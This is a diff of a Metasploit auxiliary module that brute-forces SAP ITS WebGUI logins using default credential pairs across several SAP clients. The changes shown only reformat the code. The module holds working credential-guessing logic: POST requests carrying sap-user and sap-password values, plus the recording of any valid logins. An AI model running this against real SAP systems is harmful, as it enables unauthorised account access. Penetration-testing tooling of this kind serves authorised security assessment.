@@ -30,14 +30,12 @@ class MetasploitModule < Msf::Auxiliary
         variable to true. The MSF_DATA_DIRECTORY/wordlists/sap_default.txt path store
         stores these default combinations.
       },
-      'References' =>
-        [
-          [ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]
-        ],
-      'Author' =>
-        [
-          'nmonkee'
-        ],
+      'References' => [
+        [ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]
+      ],
+      'Author' => [
+        'nmonkee'
+      ],
       'License' => MSF_LICENSE
 
     )
@@ -46,16 +44,17 @@ class MetasploitModule < Msf::Auxiliary
         Opt::RPORT(8000),
         OptString.new('TARGETURI', [true, 'URI', '/']),
         OptString.new('CLIENT', [false, 'Client can be single (066), comma separated list (000,001,066) or range (000-999)', '000,001,066']),
-        OptBool.new('DEFAULT_CRED',[false, 'Check using the default password and username',true]),
-        OptString.new('USERPASS_FILE',[false, '',nil])
-      ])
+        OptBool.new('DEFAULT_CRED', [false, 'Check using the default password and username', true]),
+        OptString.new('USERPASS_FILE', [false, '', nil])
+      ]
+    )
   end
 
   def run_host(ip)
     uri = target_uri.to_s
     if datastore['CLIENT'].nil?
       print_status("Using default SAP client list")
-      client = ['000','001','066']
+      client = ['000', '001', '066']
     else
       client = []
       if datastore['CLIENT'] =~ /^\d{3},/
@@ -70,16 +69,15 @@ class MetasploitModule < Msf::Auxiliary
         print_status("Brute forcing client #{datastore['CLIENT']}")
       else
         print_status("Invalid CLIENT - using default SAP client list instead")
-        client = ['000','001','066']
+        client = ['000', '001', '066']
       end
     end
-    saptbl = Msf::Ui::Console::Table.new( Msf::Ui::Console::Table::Style::Default,
-      'Header'  => "[SAP] Credentials",
-      'Prefix'  => "\n",
-      'Postfix' => "\n",
-      'Indent'  => 1,
-      'Columns' => ["host","port","client","user","pass"])
-
+    saptbl = Msf::Ui::Console::Table.new(Msf::Ui::Console::Table::Style::Default,
+                                         'Header' => "[SAP] Credentials",
+                                         'Prefix' => "\n",
+                                         'Postfix' => "\n",
+                                         'Indent' => 1,
+                                         'Columns' => ["host", "port", "client", "user", "pass"])
 
     if datastore['DEFAULT_CRED']
       credentials = extract_word_pair(Msf::Config.data_directory + '/wordlists/sap_default.txt')
@@ -101,7 +99,6 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
     print(saptbl.to_s)
-
   end
 
   def report_cred(opts)
@@ -131,12 +128,12 @@ class MetasploitModule < Msf::Auxiliary
     create_credential_login(login_data)
   end
 
-  def bruteforce(uri,user,pass,cli)
+  def bruteforce(uri, user, pass, cli)
     begin
       path = "sap/bc/gui/sap/its/webgui/"
       cookie = "Active=true; sap-usercontext=sap-language=EN&sap-client=#{cli}"
       res = send_request_cgi({
-        'uri'    => "#{uri}#{path}",
+        'uri' => "#{uri}#{path}",
         'method' => 'POST',
         'cookie' => cookie,
         'vars_post' => {
@@ -150,8 +147,8 @@ class MetasploitModule < Msf::Auxiliary
           'sap-user' => user,
           'sap-password' => pass,
           'sap-language' => 'EN'
-          }
-        })
+        }
+      })
     rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
       print_error("[SAP] #{rhost}:#{rport} - Service failed to respond")
       return false
